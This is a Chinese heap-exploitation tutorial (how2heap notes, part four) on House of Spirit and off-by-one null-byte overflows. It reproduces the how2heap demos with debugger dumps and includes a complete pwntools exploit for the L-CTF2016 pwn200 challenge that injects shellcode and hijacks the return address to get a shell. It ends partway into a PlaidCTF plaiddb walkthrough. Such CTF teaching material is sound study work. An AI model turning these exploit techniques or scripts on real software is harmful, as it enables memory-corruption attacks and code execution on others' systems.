> 原文链接: https://www.anquanke.com//post/id/197660 


# How2Heap堆利用学习笔记（四）


                                阅读量   
                                **858358**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01cca9ce390216e96f.png)](https://p4.ssl.qhimg.com/t01cca9ce390216e96f.png)



通过前三篇文章的学习，我们了解了堆利用的基本概念和技术。本篇文章，我们将要了解堆利用中的House技术以及与off by one结合后的利用手法。

House of系列并不是某种漏洞的大类，而是堆利用的一些技巧，最早在，其适用性取决的当前的漏洞环境，非常考验攻击者对堆管理的熟悉程度，和思维的灵活性。学习这部分切记不可死记硬背，而是需要多思考漏洞产生的原因，多看glibc源代码，也可以为将来分析实际漏洞打基础。



## 0x01 House Of Spirit

House of Spirit技术是一类组合型漏洞，通常需要结合其他漏洞一起作用。

核心原理时通过free一个伪造的chunk，来控制一块我们本来无法读写的位置。关键的部分是在free时，需要控制chunk的size和nextsize的值，而这两个值的位置大概如图所示，

```
+------------------+
|        |   size  |
+------------------+
|                  |
|    fake chunk    |
|                  |
+------------------+
|         |nextsize|
+------------------+
```

**利用场景**
<li>
**场景1.**最经典的利用场景便是，利用house of spirit来控制一块不可控的内存空间。
<pre><code class="hljs ruby">+------------------+
|     可控区域1     |
+------------------+
| 目标区域（不可控，  |
| 多为返回地址/函数  |
| 指针等）          |
+------------------+
|     可控区域2     |
+------------------+
</code></pre>
</li>
<li>
**场景2.**作为一个组合型漏洞，house of spirit同样也可以结合double free来实现一个fastbin_attack。在 off by one漏洞中，创造一个可控的重叠chunk，通过house of spirit在chunk中间free出一个fake chunk。然后因为地址可控，所以对fake chunk实现fastbin attack。
<pre><code class="hljs diff">+------------------+&lt;--point1
|        big chunk1   |
+------------------+&lt;--point2 &lt;--free
|     (fake)chunk2   |
+------------------+
|     big chunk1   |
+------------------+
</code></pre>
这两种场景，在下文都会给出案例。接下来让我们根据how2heap的代码来学习这个技术的原理。
</li>
**原理解析**

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()
`{`
    fprintf(stderr, "This file demonstrates the house of spirit attack.n");

    fprintf(stderr, "Calling malloc() once so that it sets up its memory.n");
    malloc(1);

    fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.n");
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]);

    fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n");
    fake_chunks[1] = 0x40; // this is the size

    fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize

    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n", &amp;fake_chunks[1]);
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n");
    a = &amp;fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!n", &amp;fake_chunks[1], &amp;fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %pn", malloc(0x30));
`}`
```

使用malloc初始化heap空间。

```
fprintf(stderr, "Calling malloc() once so that it sets up its memory.n");
    malloc(1);
```

在栈中创建fake chunk（没错，就是在栈中）

```
fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.n");
    unsigned long long *a;
    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]);
```

初始化fake chunk，在构造fake chunk的时候需要绕过两个检查。

定义在_int_free函数中(malloc/malloc.c)
- chunk的大小要大于2*SIZE_SZ系哦啊雨system_mem
```
#if TRIM_FASTBINS
      /*
    If TRIM_FASTBINS set, don't place chunks
    bordering top into fastbins
      */
      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)
#endif
      ) `{`

    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)
    || __builtin_expect (chunksize (chunk_at_offset (p, size))
                 &gt;= av-&gt;system_mem, 0)) 
    `}`
```
- free的内存大小不能大于fastbin的最大值（128）程序定义了fake_chunk的结构如下,
```
fake_chunks[1] = 0x40; // this is the size
    fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
    fake_chunks[9] = 0x1234; // nextsize
```

```
gef➤  x/20xg 0x00007fffffffddb0
0x7fffffffddb0:    0x0000000000000000    0x0000000000000040 (size)
0x7fffffffddc0:    0x0000000000000000    0x000000000000ff00 &lt;--fake chunk
0x7fffffffddd0:    0x0000000000000001    0x00000000004008ed
0x7fffffffdde0:    0x0000000000000000    0x0000000000000000
0x7fffffffddf0:    0x00000000004008a0    0x0000000000001234 (next size)
```

将这块内存free掉，再次查看fastbin，可以看到栈中的这块区域已经被链入fastbin中。

```
a = &amp;fake_chunks[2];
fprintf(stderr, "Freeing the overwritten pointer.n");
free(a);
```

```
gef➤  heap bins fast 
─────────────────────[ Fastbins for arena 0x7ffff7dd1b20 ]─────────────────────
Fastbin[0] 0x00
Fastbin[1] 0x00
Fastbin[2]  →   FreeChunk(addr=0x7fffffffddc0,size=0x40)  
Fastbin[3] 0x00
```

此时只需要申请一个合适大小的chunk，我们就能获取一块在栈中的可控内存。此时的主要目标，自然就可以设定为栈中的ret地址或者函数指针。

```
fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!n", &amp;fake_chunks[1], &amp;fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %pn", malloc(0x30));
```

获取栈中的fake chunk。

```
malloc(0x30): 0x7fffffffddc0
```



## 0x02 poison_null_byte

poison_null_byte便是我们常说的off by one，通过在堆中溢出一个字节，构造一个重叠的堆块。

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

int main()
`{`
    fprintf(stderr, "Welcome to poison null byte 2.0!n");
    fprintf(stderr, "Tested in Ubuntu 14.04 64bit.n");
    fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.n");
    fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.n");

    uint8_t* a;
    uint8_t* b;
    uint8_t* c;
    uint8_t* b1;
    uint8_t* b2;
    uint8_t* d;
    void *barrier;

    fprintf(stderr, "We allocate 0x100 bytes for 'a'.n");
    a = (uint8_t*) malloc(0x100);
    fprintf(stderr, "a: %pn", a);
    int real_a_size = malloc_usable_size(a);
    fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "
        "(it may be more than 0x100 because of rounding): %#xn", real_a_size);

    /* chunk size attribute cannot have a least significant byte with a value of 0x00.
     * the least significant byte of this will be 0x10, because the size of the chunk includes
     * the amount requested plus some amount required for the metadata. */
    b = (uint8_t*) malloc(0x200);

    fprintf(stderr, "b: %pn", b);

    c = (uint8_t*) malloc(0x100);
    fprintf(stderr, "c: %pn", c);

    barrier =  malloc(0x100);
    fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.n"
        "The barrier is not strictly necessary, but makes things less confusingn", barrier);

    uint64_t* b_size_ptr = (uint64_t*)(b - 8);

    // added fix for size==prev_size(next_chunk) check in newer versions of glibc
    // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
    // this added check requires we are allowed to have null pointers in b (not just a c string)
    //*(size_t*)(b+0x1f0) = 0x200;
    fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "
        "the check 'chunksize(P) != prev_size (next_chunk(P))'n");
    // we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)
    // which is the value of b.size after its first byte has been overwritten with a NULL byte
    *(size_t*)(b+0x1f0) = 0x200;

    // this technique works by overwriting the size metadata of a free chunk
    free(b);

    fprintf(stderr, "b.size: %#lxn", *b_size_ptr);
    fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_usen");
    fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'n");
    a[real_a_size] = 0; // &lt;--- THIS IS THE "EXPLOITED BUG"
    fprintf(stderr, "b.size: %#lxn", *b_size_ptr);

    uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
    fprintf(stderr, "c.prev_size is %#lxn",*c_prev_size_ptr);

    // This malloc will result in a call to unlink on the chunk where b was.
    // The added check (commit id: 17f487b), if not properly handled as we did before,
    // will detect the heap corruption now.
    // The check is this: chunksize(P) != prev_size (next_chunk(P)) where
    // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
    // next_chunk(P) == b-0x10+0x200 == b+0x1f0
    // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
    fprintf(stderr, "We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))n",
        *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
    b1 = malloc(0x100);

    fprintf(stderr, "b1: %pn",b1);
    fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. "
        "At this point c.prev_size should have been updated, but it was not: %#lxn",*c_prev_size_ptr);
    fprintf(stderr, "Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
        "before c.prev_size: %lxn",*(((uint64_t*)c)-4));
    fprintf(stderr, "We malloc 'b2', our 'victim' chunk.n");
    // Typically b2 (the victim) will be a structure with valuable pointers that we want to control

    b2 = malloc(0x80);
    fprintf(stderr, "b2: %pn",b2);

    memset(b2,'B',0x80);
    fprintf(stderr, "Current b2 content:n%sn",b2);

    fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').n");

    free(b1);
    free(c);

    fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.n");
    d = malloc(0x300);
    fprintf(stderr, "d: %pn",d);

    fprintf(stderr, "Now 'd' and 'b2' overlap.n");
    memset(d,'D',0x300);

    fprintf(stderr, "New b2 content:n%sn",b2);

    fprintf(stderr, "Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
        "for the clear explanation of this technique.n");
`}`
```

首先，为chunk_a申请0x100字节的堆空间。

这里需要注意，用malloc_usable_size获取chunk_a的真实大小。原因是malloc时会自动8位对齐，实际申请的空间应该是略大于0x100.

```
fprintf(stderr, "We allocate 0x100 bytes for 'a'.n");
    a = (uint8_t*) malloc(0x100);
    fprintf(stderr, "a: %pn", a);
    int real_a_size = malloc_usable_size(a);
    fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "
        "(it may be more than 0x100 because of rounding): %#xn", real_a_size);
```

继续申请内存,barrier部分作为隔离chunk_c和top chunk的部分，防止chunk_c被free时被top chunk合并，这点我们之前也提到过很多次。

```
/* chunk size attribute cannot have a least significant byte with a value of 0x00.
     * the least significant byte of this will be 0x10, because the size of the chunk includes
     * the amount requested plus some amount required for the metadata. */
    b = (uint8_t*) malloc(0x200);

    fprintf(stderr, "b: %pn", b);

    c = (uint8_t*) malloc(0x100);
    fprintf(stderr, "c: %pn", c);

    barrier =  malloc(0x100);
    fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.n"
        "The barrier is not strictly necessary, but makes things less confusingn", barrier);
```

为chunk_c写入fake_prev_size，即chunk_b+0x1f0的位置。至于写在这里有什么目的，我们接着往下看。

```
//*(size_t*)(b+0x1f0) = 0x200;
    fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "
        "the check 'chunksize(P) != prev_size (next_chunk(P))'n");
    // we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)
    // which is the value of b.size after its first byte has been overwritten with a NULL byte
    *(size_t*)(b+0x1f0) = 0x200;
```

****Off by one****(a[real_a_size] = 0),将chunk_b(free)的size值替换，原size值的构成为`(0x200 + 0x10) | prev_in_use`,但是此处将pre inuse改为0，结果为`(0x200) | prev_in_use=0`，这符合Off by one写入一个0字节后的效果。

好，此时观察chunk_b,读者应该就明白之前为什么要写入fake_prev_size，因为chunk_b的长度变短了，fake_pre_size的位置正好位于变短的chunk_b的pre_size位（严格意义上是chunk_c的pre size位，但是这个chunk_c并不存在）。即注释中的绕过`chunksize(P) == == prev_size (next_chunk(P)`的check。

当然，所有操作之前，必须先free chunk_b，因为只有free chunk才需要pre size位，malloc_chunk的pre size位是data的一部分。

```
// this technique works by overwriting the size metadata of a free chunk
    free(b);

    fprintf(stderr, "b.size: %#lxn", *b_size_ptr);
    fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_usen");
    fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'n");
    a[real_a_size] = 0; // &lt;--- THIS IS THE "EXPLOITED BUG"
    fprintf(stderr, "b.size: %#lxn", *b_size_ptr);
fprintf(stderr, "We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))n",
        *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
```

```
gef➤  x/150xg 0x603000
0x603000:    0x0000000000000000    0x0000000000000111
0x603010:    0x0000000000000000    0x0000000000000000 &lt;--chunk_a
0x603020:    0x0000000000000000    0x0000000000000000
...
0x603100:    0x0000000000000000    0x0000000000000000
0x603110:    0x0000000000000000    0x0000000000000200 &lt;--size(off by one)[(0x200)|prev_in_use=0]
0x603120:    0x00007ffff7dd1b78    0x00007ffff7dd1b78 &lt;--chunk_b(free)
0x603130:    0x0000000000000000    0x0000000000000000
0x603140:    0x0000000000000000    0x0000000000000000
...
0x603300:    0x0000000000000000    0x0000000000000000
0x603310:    0x0000000000000200    0x0000000000000000 &lt;-- fake pre_size
0x603320:    0x0000000000000210    0x0000000000000111 &lt;-- real pre_size
0x603330:    0x0000000000000000    0x0000000000000000 &lt;--chunk_c
```

申请b1，会占位之前chunk_b的空间。

```
b1 = malloc(0x100);
    fprintf(stderr, "b1: %pn",b1);
    fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. "
```

申请chunk_b2作为我们的victim案例，并将b1 free掉。向chunk b2写入数据（B）。内存状态如图所示。

```
b2 = malloc(0x80);
    fprintf(stderr, "b2: %pn",b2);
    memset(b2,'B',0x80);
    fprintf(stderr, "Current b2 content:n%sn",b2);
    fprintf(stderr, "Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').n");
    free(b1);
```

```
gef➤  x/150xg 0x603000
0x603000:    0x0000000000000000    0x0000000000000111
0x603010:    0x0000000000000000    0x0000000000000000
...
0x603110:    0x0000000000000000    0x0000000000000111
0x603120:    0x00000000006032b0    0x00007ffff7dd1b78 &lt;--chunk_b1(free)
0x603130:    0x0000000000000000    0x0000000000000000
...
0x603210:    0x0000000000000000    0x0000000000000000
0x603220:    0x0000000000000110    0x0000000000000090
0x603230:    0x4242424242424242    0x4242424242424242 &lt;--chunk_b2
0x603240:    0x4242424242424242    0x4242424242424242
0x603250:    0x4242424242424242    0x4242424242424242
0x603260:    0x4242424242424242    0x4242424242424242
0x603270:    0x4242424242424242    0x4242424242424242
0x603280:    0x4242424242424242    0x4242424242424242
0x603290:    0x4242424242424242    0x4242424242424242
0x6032a0:    0x4242424242424242    0x4242424242424242
0x6032b0:    0x0000000000000000    0x0000000000000061
0x6032c0:    0x00007ffff7dd1b78    0x0000000000603110
0x6032d0:    0x0000000000000000    0x0000000000000000
0x6032e0:    0x0000000000000000    0x0000000000000000
0x6032f0:    0x0000000000000000    0x0000000000000000
0x603300:    0x0000000000000000    0x0000000000000000
0x603310:    0x0000000000000060    0x0000000000000000
0x603320:    0x0000000000000210    0x0000000000000110
0x603330:    0x0000000000000000    0x0000000000000000 &lt;--chunk_c

0x603430:    0x0000000000000000    0x0000000000000111
```

现在我们只需要`free(c)`，程序会将chunk_c和chunk_b1之间的超长空间都free掉。查看unsort bins，可以看到这个长0x320的chunk。而未被free的chunk_b2以及free_chunk_b3(见图中)都被包含在这个chunk中。

```
gef➤  x/150xg 0x603000
0x603000:    0x0000000000000000    0x0000000000000111
0x603010:    0x0000000000000000    0x0000000000000000 &lt;--chunk_a
0x603020:    0x0000000000000000    0x0000000000000000
...
0x603110:    0x0000000000000000    0x0000000000000321
0x603120:    0x00000000006032b0    0x00007ffff7dd1b78 &lt;--a long free chunk（pre chunk_b1）
0x603130:    0x0000000000000000    0x0000000000000000
...
0x603220:    0x0000000000000110    0x0000000000000090
0x603230:    0x4242424242424242    0x4242424242424242 &lt;-- chunk_b2
0x603240:    0x4242424242424242    0x4242424242424242
0x603250:    0x4242424242424242    0x4242424242424242
0x603260:    0x4242424242424242    0x4242424242424242
0x603270:    0x4242424242424242    0x4242424242424242
0x603280:    0x4242424242424242    0x4242424242424242
0x603290:    0x4242424242424242    0x4242424242424242
0x6032a0:    0x4242424242424242    0x4242424242424242
0x6032b0:    0x0000000000000000    0x0000000000000061
0x6032c0:    0x00007ffff7dd1b78    0x0000000000603110 &lt;--free_chunk_b3
0x6032d0:    0x0000000000000000    0x0000000000000000
...
0x603310:    0x0000000000000060    0x0000000000000000
0x603320:    0x0000000000000210    0x0000000000000110 &lt;--chunk_c


gef➤  heap bins unsorted 
────────────────────[ Unsorted Bin for arena 'main_arena' ]────────────────────
[+] Found base for bin(0): fw=0x603110, bk=0x6032b0
 →   FreeChunk(addr=0x603120,size=0x320)   →   FreeChunk(addr=0x6032c0,size=0x60)
```

申请这个超大的chunk，通过写入数据便能修改chunk_b2的任意数据。

```
fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.n");
    d = malloc(0x300);
    fprintf(stderr, "d: %pn",d);

    fprintf(stderr, "Now 'd' and 'b2' overlap.n");
    memset(d,'D',0x300);

    fprintf(stderr, "New b2 content:n%sn",b2);
```

此时我们能够通过对chunk_d写入数据（D），修改chunk_b2的数据。

```
b2: 0x15fd230
Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2'.
d: 0x15fd120
Now 'd' and 'b2' overlap.
New b2 content:
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
```

poison_null_byte，实际上通过覆盖pre inuse和pre size来伪造一个很长的fake chunk（当然，how2heap的案例更加隐晦一些，并没有直接覆盖pre size，而是fake了另一个），覆盖其他chunk造成一个类似double free（但是chunk之间是包含关系）的效果。此时我们申请的超长chunk_d就可以控制chunk_b2的内部数据。之后可以结合fastbin_attack或者house技术来完成利用。



## 0x03 案例分析

### <a class="reference-link" name="L-CTF2016%20pwn200%EF%BC%88%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF1%EF%BC%89"></a>L-CTF2016 pwn200（利用场景1）

2016L-CTF的pwn题，解题思路不唯一，但这题是一个学习house of spirit的好案例。

[下载地址](https://pan.baidu.com/s/1kVIyYer)

**分析**

本题少见的NX是关掉的题目，通过Hose of spirit的在栈空间申请一个fake chunk，实现栈中的越界读写。

```
gef➤  checksec
[+] checksec for '/home/p0kerface/Documents/house of spirit/pwn200'
Canary                        : No
NX                            : No
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

**存在两个漏洞点**
- 出存在一个off by one。写入48个字节，v2字符串会缺少x0结尾，就可以造成越界读取栈底（RBP）的值。
```
int sub_400A8E()
`{`
  signed __int64 i; // [rsp+10h] [rbp-40h]
  char v2[48]; // [rsp+20h] [rbp-30h]

  puts("who are u?");
  for ( i = 0LL; i &lt;= 47; ++i )
  `{`
    read(0, &amp;v2[i], 'x01');
    if ( v2[i] == 'n' ) //为字符串添加 x0 结尾
    `{`
      v2[i] = '';
      break;
    `}`
  `}`
  printf("%s, welcome to xdctf~n", v2);
  puts("give me your id ~~?");
  read_option();
  return sub_400A29();
`}`

```

​ 将shellcode作为48字节的一部分写入v2数组，同时通过EBP地址可以计算出shellcode_addr(v2数组起始地址)。内存状态如下图所示。

```
p.recvuntil("who are u?n")
p.sendline(shellcode.ljust(48,"x00"))
p.recv(48)
shellcode_addr=u64(p.recv(6).ljust(8,"x00"))-0x50
print "Shellcode address="+hex(shellcode_addr)
```

```
gef➤  x/30xg 0x7ffc8932e210-0x50
0x7ffc8932e1c0:    0x0000000000000009    0x00000000004008b5 &lt;--RIP
0x7ffc8932e1d0:    0x0000000000003233    0x0000000001db8010
0x7ffc8932e1e0:    0x00007ffc8932e240    0x0000000000400b34
0x7ffc8932e1f0:    0x00007f42d1d0c8e0    0x00007f42d1f1f700
0x7ffc8932e200:    0x0000000000000030    0x0000000000000020 &lt;--id
0x7ffc8932e210:    0x6e69622fb848686a    0xe7894850732f2f2f &lt;--v2[] &lt;--shellcode
0x7ffc8932e220:    0x2434810101697268    0x6a56f63101010101
0x7ffc8932e230:    0x894856e601485e08    0x050f583b6ad231e6
0x7ffc8932e240:    0x00007ffc8932e260    0x0000000000400b59
0x7ffc8932e250:    0x00007ffc8932e348    0x0000000100000000 
0x7ffc8932e260:    0x0000000000400b60    0x00007f42d1968830 &lt;--RIP(left)
```
- 写入0x40个字节，但是buf只有0x38字节，超出的字节会覆盖dest，即能够修改ptr指针。我们可以着手布置我们的fake chunk。
```
int sub_400A29()
`{`
  char buf; // [rsp+0h] [rbp-40h]
  char *dest; // [rsp+38h] [rbp-8h]

  dest = (char *)malloc(0x40uLL);
  puts("give me money~");
  read(0, &amp;buf, 0x40uLL);
  strcpy(dest, &amp;buf);
  ptr = dest;
  return case();
`}`
```

写入money的函数（sub_400A29）是在写入id的函数（sub_400A8E）内调用的，也就是说`char buf; // [rsp+0h] [rbp-40h]`在id的低位置处，两者中间存在sub_400A29函数的RIP和RBP。所以我们可以通过id和buf分别模拟一个fake chunk的size和next size，就能伪造一个chunk。（如下图所示）

```
gef➤  x/40xg 0x7ffe5ce04cf0-0x90
0x7ffe5ce04c60:    0x0000000000000000    0x0000000202070168
0x7ffe5ce04c70:    0x00007ffe5ce04cc0    0x0000000000400a8c &lt;--RIP
0x7ffe5ce04c80:    0x0000000000000000    0x0000000000000000
0x7ffe5ce04c90:    0x0000000000000000    0x0000000000000000
0x7ffe5ce04ca0:    0x0000000000000000    0x0000000000000041 &lt;--size of fake chunk (buf[5])
0x7ffe5ce04cb0:    0x0000000000000000    0x00007ffe5ce04cb0 &lt;--ptr --&gt; fake chunk
0x7ffe5ce04cc0:    0x00007ffe5ce04d20    0x0000000000400b34 &lt;--RIP
0x7ffe5ce04cd0:    0x00007fc301e438e0    0x00007fc302056700
0x7ffe5ce04ce0:    0x0000000000000030    0x0000000000000020 &lt;--next size of fake chunk (id)
0x7ffe5ce04cf0:    0x6e69622fb848686a    0xe7894850732f2f2f &lt;--shellcode
0x7ffe5ce04d00:    0x2434810101697268    0x6a56f63101010101
0x7ffe5ce04d10:    0x894856e601485e08    0x050f583b6ad231e6
0x7ffe5ce04d20:    0x00007ffe5ce04d40    0x0000000000400b59
0x7ffe5ce04d30:    0x00007ffe5ce04e28    0x0000000100000000
0x7ffe5ce04d40:    0x0000000000400b60    0x00007fc301a9f830
```

实现代码

```
p.recvuntil("give me your id")
p.sendline("32") # next size
p.recvuntil("give me money")
fake_chunk=shellcode_addr-0x40
p.sendline(p64(0)*5+p64(0x41)+p64(0)*1+p64(fake_chunk)) #布置fake chunk

p.sendline("2") #free(ptr)
```

调用free之后，我们成功将栈中的fake chunk并入fastbin。

```
gef➤  heap bins fast 
─────────────────────[ Fastbins for arena 0x7fc301e43b20 ]─────────────────────
Fastbin[0] 0x00
Fastbin[1] 0x00
Fastbin[2]  →   FreeChunk(addr=0x7ffe5ce04cb0,size=0x40)  
Fastbin[3] 0x00
Fastbin[4] 0x00
Fastbin[5] 0x00
Fastbin[6] 0x00
Fastbin[7] 0x00
Fastbin[8] 0x00
Fastbin[9] 0x00
```

之后的操作只需要再申请回来，就能修改sub_400A29的EIP，修改EIP为shellcode。只需要check_out，退出栈的时候就会触发shellcode。

```
p.sendline("1") # malloc(0x38)
p.recvuntil("your choice : how long?")
p.sendline("50")
p.recvuntil("give me more money :")
p.sendline(p64(0)*3+p64(shellcode_addr)) # overflow EIP

p.sendline("3") #break
```

完整的Exp

```
#! /usr/bin/python
from pwn import *

p=process("./pwn200")
#context.log_level='Debug'
#gdb.attach(p,"b *0x400a8e")
shellcode=asm(shellcraft.amd64.linux.sh(), arch = 'amd64')

p.recvuntil("who are u?n")
p.send(shellcode.ljust(48))
p.recvuntil(shellcode.ljust(48))
shellcode_addr=u64(p.recv(6).ljust(8,"x00"))-0x50
print "Shellcode address="+hex(shellcode_addr)

p.recvuntil("give me your id")
p.sendline("32")
p.recvuntil("give me money")
fake_chunk=shellcode_addr-0x40
p.sendline(p64(0)*5+p64(0x41)+p64(0)*1+p64(fake_chunk))

p.sendline("2")

p.sendline("1")
p.recvuntil("your choice : how long?")
p.sendline("50")
p.recvuntil("give me more money :")
p.sendline(p64(0)*3+p64(shellcode_addr))

p.sendline("3")
p.interactive()
```

### <a class="reference-link" name="2015%20Plaiddb%EF%BC%88%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF2%EF%BC%89"></a>2015 Plaiddb（利用场景2）

[下载地址](https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb)

[完整分析](https://migraine-sudo.github.io/2019/12/25/AFL-FUZZ/)

Plaiddb存在一个Off By one的漏洞，该漏洞能创造两个重叠的chunk（一个长一个短）。

同样，这道题也需要使用Off by one和House of spirit结合，不过在这里该漏洞的目的是在一段完全可控的内存中创建一个fake chunk，然后实现fastbin attack。

#### <a class="reference-link" name="OFF%20BY%20ONE%E9%83%A8%E5%88%86"></a>OFF BY ONE部分

通过off by one来制造double free漏洞<br>
off_by_one可以覆盖掉下一个chunk的size的最低byte<br>
1.使得下个chunk的size变小<br>
2.使得pre_inuse bit被改为0<br>
下一个chunk被free掉时，会和前一个chunk合并（如果前一个chunk是free的话，即pre_inuse为0），前一个chunk由当前写入的prevsize（可控，chunk的头8个字节）来指定。通过控制pre size可以合并一个非常大的chunk，导致double free。

首先构造堆的结构，为后面的地址泄漏最好备案。<br>
这里给出笔者的布置的结构，这个结构并不唯一，并且不一定是最优解，读者可以将其作为参考。

```
PUT("a"*8,128,'A'*128) 
PUT("b"*8,2,'B')
PUT("c"*8,2,'C')
PUT("b"*8,248,'B'*248) #为Tree B重新申请data空间
PUT("c"*8,280,'C'*248+p64(0x21)+'C'*24) #为Tree C重新申请data空间
#以上步骤是为了让B和C的data部分相邻
#C的data部分构造是为了防止 next size check #invalid next size (normal) 的check
#因为off by one 会导致 size最后一位被覆盖为0 ，所以data部分的大小会变小，需要构造一个fake结构来绕过检查。（详见glibc 源代码）
```

#### <a class="reference-link" name="House%20of%20Spirit%E9%83%A8%E5%88%86"></a>House of Spirit部分

House of Splrit + Fastbin attack<br>
